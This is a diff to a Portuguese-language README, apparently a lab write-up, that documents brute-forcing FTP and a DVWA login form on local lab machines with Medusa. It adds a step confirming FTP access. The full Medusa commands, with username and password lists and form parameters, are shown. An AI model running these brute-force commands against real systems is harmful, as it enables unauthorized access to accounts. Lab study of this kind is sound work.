@@ -49,9 +49,13 @@ Resultado (Senha Encontrada):
 Comando: medusa -h 192.168.56.101 -U usuarios.txt -P senhas.txt -M ftp
 ![Acesso FTP](./images/04.png)
 
+Validação do Acesso: Login realizado com sucesso no servidor de arquivos via terminal.
+
+Comando: ftp 192.168.56.101
+![Acesso FTP](./images/05.png)
+
 4. Ataque a Aplicação Web (DVWA)
 O Medusa também foi utilizado para realizar o brute force no formulário de login do DVWA.
-![Acesso FTP](./images/05.png)
 
 Comando: medusa -h 192.168.56.102 -U usuarios.txt -P senhas.txt -M http \ -m PAGE: "/dvwa/login.php" \ -m FORM: "username=^USER^&password=^PASS^&Login=Login" \ -m "FAIL=Login failed" -t 6
 Resultado Medusa Web:
